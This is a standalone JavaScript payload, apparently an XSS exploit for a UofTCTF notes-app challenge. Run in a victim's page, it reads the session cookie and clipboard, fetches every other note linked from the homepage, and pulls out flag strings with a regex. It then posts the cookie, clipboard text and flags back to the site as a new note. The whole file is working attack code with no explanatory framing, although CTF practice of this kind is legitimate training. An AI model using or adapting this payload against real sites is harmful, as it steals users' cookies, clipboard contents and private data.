(async function(){
  let result = '';
  let cookie = document.cookie || 'NO_COOKIE';
  
  // Try to read clipboard
  let clipboard = 'CLIPBOARD_FAILED';
  try {
    clipboard = await navigator.clipboard.readText();
  } catch(e) {
    clipboard = 'CLIPBOARD_ERROR:' + e.message;
  }
  
  // Get notes from homepage
  let h = await fetch('/').then(r=>r.text());
  let notes = h.match(/\/note\/[a-f0-9]+/g) || [];
  let unique = [...new Set(notes)];
  let current = location.pathname;
  let others = unique.filter(n => n !== current);
  
  // Fetch all other notes
  let pages = await Promise.all(others.map(n => fetch(n).then(r=>r.text()).catch(e=>'')));
  let allText = pages.join('\n');
  
  // Find flags everywhere
  let allContent = clipboard + cookie + allText;
  let flags = allContent.match(/uoftctf\{[^}]+\}/g) || ['NO_FLAG'];
  
  result = 'FLAGS:' + flags.join(',') + '\nCLIPBOARD:' + clipboard + '\nCOOKIE:' + cookie + '\nNOTES:' + others.join(',');
  
  fetch('/note/new', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'title=CLIPBOARD&body=' + encodeURIComponent(result)
  });
})();
